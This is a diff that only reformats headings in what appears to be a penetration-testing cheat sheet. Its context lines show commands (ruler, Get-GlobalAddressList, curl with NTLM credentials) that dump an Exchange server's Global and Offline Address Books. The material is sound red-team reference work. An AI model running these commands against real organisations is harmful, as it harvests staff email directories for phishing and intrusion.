@@ -817,7 +817,7 @@ mimikatz # !-
 
 ### GAL and OAB Extraction
 
-*GAL (Global Address Book) Extraction*
+**GAL (Global Address Book) Extraction**
 ```powershell
 ./ruler -k -d $domain -u $user -p $password -e user@example.com --verbose abk dump -o email_list.txt
 ```
@@ -826,15 +826,15 @@ mimikatz # !-
 PS C:\> Get-GlobalAddressList -ExchHostname mx.megacorp.com -UserName $domain\$user -Password $password -OutFile email_list.txt
 ```
 
-*OAB (Offline Address Book) Extraction*
+**OAB (Offline Address Book) Extraction**
 
-> extract OAB.XML file which contains records
+*extract OAB.XML file which contains records*
 ```bash
 curl -k --ntlm -u '$domain\$user:$password' https://$domain/OAB/$OABUrl/oab.xml > oab.xml
 
 cat oab.xml |grep '.lzx' |grep data
 ```
-> extract LZX compressed file :
+*extract LZX compressed file*
 ```bash
 curl -k --ntlm -u '$domain\$user:$password' https://$domain/OAB/$OABUrl/$OABId-data-1.lzx > oab.lzx
 
